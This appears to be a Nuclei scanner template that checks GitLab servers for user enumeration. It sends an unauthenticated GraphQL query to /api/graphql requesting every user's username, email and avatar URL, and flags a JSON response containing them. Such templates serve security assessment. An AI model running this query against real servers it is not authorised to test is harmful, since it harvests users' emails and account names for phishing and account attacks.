id: gitlab-user-enumeration
info:
  author: pikpikcu
  name: Gitlab User enumeration
  severity: info
  tags: gitlab,enum
requests:
- body: "{\n   \"query\":\"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\\
    n    avatarUrl\\n    }\\n   }\\n  }\\n }\"\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    type: word
    words:
    - avatarUrl
    - username
    - email
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/api/graphql'
